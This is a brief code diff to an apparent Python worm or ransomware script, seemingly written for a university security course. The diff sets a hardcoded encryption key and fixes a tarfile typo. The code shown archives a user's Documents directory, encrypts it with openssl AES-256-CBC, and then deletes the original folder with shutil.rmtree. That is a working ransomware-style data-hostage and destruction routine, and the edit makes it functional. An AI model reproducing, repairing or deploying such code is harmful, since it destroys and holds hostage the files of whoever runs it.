@@ -59,7 +59,7 @@ def downloadAndEncrypt(path):
 	# create a tar
 	createTar(path)
 	# encrypt that tar
-	call(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "Document.tar", "-out", "Document.tar.enc", "-k", "pass"])
+	call(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "Document.tar", "-out", "Document.tar.enc", "-k", "cs456worm"])
 	# delete the original directory
 	shutil.rmtree('/home/cpsc/Documents/')
 
@@ -70,7 +70,7 @@ def downloadAndEncrypt(path):
 def createTar(path):
 	# Open the specified archive file (e.g. exdir.tar).
 	# If the archive does not already exit, create it.
-	tar = farfile.open("Document.tar","w:gz")
+	tar = tarfile.open("Document.tar","w:gz")
 
 	# Add the exdir/ directory to the archive
 	tar.add(path + "Document/")
